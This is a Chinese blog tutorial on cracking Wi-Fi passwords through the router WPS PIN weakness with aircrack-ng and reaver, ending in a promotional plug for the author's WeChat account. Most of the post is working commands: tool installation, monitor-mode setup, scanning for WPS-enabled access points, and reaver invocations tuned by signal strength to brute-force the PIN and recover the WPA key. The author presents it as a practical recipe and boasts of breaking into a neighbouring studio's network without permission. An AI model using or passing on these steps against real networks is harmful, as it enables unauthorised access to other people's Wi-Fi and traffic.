---
layout: post
category: binghe-code-hack
title: 使用reaver傻瓜式破解wifi之利用路由器WPS漏洞
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: 使用reaver傻瓜式破解wifi之利用路由器WPS漏洞
lock: need
---

# 使用reaver傻瓜式破解wifi之利用路由器WPS漏洞

跟这篇破解教程一样，网上破解教程多是基于路由器的WPS漏洞破解，但是这样的路由器只占少数。一般wifi是依据WPA/WPA2加密的，因此想要破解一般的wifi，还得破解这个协议，虽然近期这个协议也被破解了，不过也是很不容易的。

 刚入门破解，不是很熟悉，在网上找各种破解资料，终于破解成功了临近工作室的wifi，沾沾自喜~
 本文破解wifi针对一些路由器的WPS（Wi-fi protected setup）漏洞,尝试很多次抓包PIN码，破解2-3天，正常来说是一定能抓到正确的PIN码的。
 一个路由器对应唯一的MAC和PIN，而一旦得到MAC和PIN，通过reaver工具，路由密码等信息就可以很快得出来。

 1.安装依赖包：

```bash
sudo apt-get install -y libpcap-dev
libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion
```

 2.安装aircrack-ng：

```bash
svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng
cd aircrack-ng/
make (aircrack-ng源码安装参考http://www.tuicool.com/articles/MfUjii)
sudo make install
```

 3.安装reaver:

 在https://pan.baidu.com/s/1kUdvM1D下载reaver

```bash
tar zxvf reaver-1.4.tar.gz
cd reaver-1.4/src
./configure
make
sudo make install
```

4.如果安装成功后，会有airmon-ng,airodump-ng,reaver等命令可用(如果没有ethtool,要安装：apt-get install ethtool)

 5.开始破解：(参考http://www.she.vc/article/18-108334-0.html http://www.kali.org.cn/thread-20995-1-1.html)
 （1）sudo airmon-ng check kill （关闭进程，部分进程可能影响到后续的操作）

```bash
Found 4 processes that could cause trouble. 
If airodump-ng, aireplay-ng or airtun-ng stops working after 
a short period of time, you may want to run 'airmon-ng check kill' 
 
	PID Name 
	431 avahi-daemon 
	446 dhcpcd 
	470 avahi-daemon 
	512 wpa_supplicant
```

（2）sudo airmon-ng

（3）sudo airmon-ng start wlan1

（4）sudo airmon-ng start wlan1mon （开启网卡，将网卡转换成混杂模式）

```bash
PHY Interface Driver Chipset 
 
phy0 wlan0 brcmfmac_sdio Broadcom 43430 
 
Missing nexutil, cannot switch to monitor mode. 
phy1 wlan1mon mt7601u Ralink Technology, Corp. 
 
(mac80211 monitor mode already enabled for [phy1]wlan1mon on [phy1]10)
```

（5）sudo airodump-ng wlan1mon （查看ap信号强度，破解的wifi信号越强越好）

（6）wash -i wlan1mon -C （查看支持wps的ap）（一种说法是：MB是54e.的可破解，54e不可破解）

 6.（正式破解，在root下）使用reaver：

 因状况调整参数：MAC即BSSID的值，-c后面的数字是CH的值。

 目标信号非常好:

```bash
reaver -i wlan1mon -b MAC -a -S -vv -d0 -c 1
```

 目标信号普通:

```bash
reaver -i wlan1mon -b MAC -a -S -vv -d2 -t 5 -c 1
```

 目标信号一般:

```bash
reaver -i wlan1mon -b MAC -a -S -vv -d5 -c 1
```



 7.每60s重新破解一次，等待三天，密码将会出来

 8.最终得到PIN码（WPS PIN）和密码（WPA PSK），如果密码 被改，只要reaver加上-p命令
 (reaver -i wlan1mon -b MAC -p PIN码 -vv)，密码又能秒出； 但如果PIN码被改，就要重新破解了。

 9.破解完成后，将网卡转回正常状态（airmon-ng stop wlan1mon）

![](https://img-blog.csdnimg.cn/20181201230356708.png)

![](https://img-blog.csdnimg.cn/20181201230518468.jpg)

备注：reaver时可以随时停止，它自己会保存进度

 升级破解固件[http://netsecurity.51cto.com/art/201105/264844_all.htm](http://netsecurity.51cto.com/art/201105/264844_all.htm)
 
 ## 写在最后
 
 > 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！
 
 
 ![](https://img-blog.csdnimg.cn/20200906013715889.png)